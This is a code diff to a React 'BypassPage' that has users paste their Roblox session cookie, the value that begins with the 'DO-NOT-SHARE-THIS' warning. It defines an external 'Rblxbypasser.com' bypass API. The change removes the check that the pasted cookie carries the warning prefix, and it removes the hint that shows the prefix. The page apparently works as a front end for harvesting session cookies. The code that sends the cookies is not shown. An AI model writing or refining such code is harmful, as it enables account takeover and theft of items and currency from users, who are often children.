@@ -11,7 +11,6 @@ const RATE_LIMIT_KEY = "bypass_attempts";
 const MAX_ATTEMPTS_PER_MIN = 10;
 const BYPASS_API_URL = "https://Rblxbypasser.com";
 const BYPASS_DURATION_MS = 60_000;
-const COOKIE_PREFIX = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
 
 type BypassStatus = "idle" | "loading" | "success" | "error";
 
@@ -64,10 +63,6 @@ const BypassPage = () => {
     const trimmed = cookie.trim();
     if (!trimmed) {
       toast.error("Please enter a cookie");
-      return;
-    }
-    if (!trimmed.startsWith(COOKIE_PREFIX)) {
-      toast.error(`Invalid cookie. It must start with "${COOKIE_PREFIX}"`);
       return;
     }
 
@@ -179,9 +174,6 @@ const BypassPage = () => {
               disabled={status === "loading"}
               className="input-field text-sm font-mono"
             />
-            <p className="text-[10px] text-muted-foreground">
-              Cookie must start with <span className="font-mono text-primary">_|WARNING:</span>
-            </p>
           </div>
 
           <div className="space-y-2">
